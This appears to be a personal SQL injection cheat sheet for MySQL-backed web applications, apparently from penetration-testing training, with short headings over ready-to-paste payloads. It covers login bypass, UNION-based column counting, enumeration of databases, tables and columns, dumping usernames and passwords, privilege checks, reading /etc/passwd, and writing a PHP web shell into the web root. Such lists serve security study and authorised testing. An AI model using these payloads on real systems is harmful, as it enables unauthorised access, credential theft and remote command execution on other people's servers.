## Authentication Bypass

Basic Auth Bypass without and with comments

```sh
admin' or '1'='1
```

```sh
admin')-- -
```

[Autre payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

## Union Injection

Detect number of columns using order by 

```sh
' order by 1-- -
```

Detect number of columns using Union injection

```sh
cn' UNION select 1,2,3-- - 	
```

Basic Union injection

```sh
cn' UNION select 1,@@version,3,4-- -
```

Union injection for 4 columns

```sh
UNION select username, 2, 3, 4 from passwords-- -
```

## DB Enumeration

Fingerprint MySQL with query output

```sh 	
SELECT @@version
```

Fingerprint MySQL with no output

```sh
SELECT SLEEP(5) 	
```

Current database name

```sh
cn' UNION select 1,database(),2,3-- -
```

List all databases

```sh
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

List all tables in a specific database

```sh
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

List all columns in a specific table

```sh
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Dump data from a table in another database

```sh
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

## Privileges 	

Find current user

```sh
cn' UNION SELECT 1, user(), 3, 4-- -
```

Find if user has admin privileges

```sh
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

Find if all user privileges

```sh
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -
```

Find which directories can be accessed through MySQL

```sh
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - 	
```

## File Injection 	

Read local file

```sh
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Write a string to a local file

```sh
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

Write a web shell into the base web directory

```sh
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
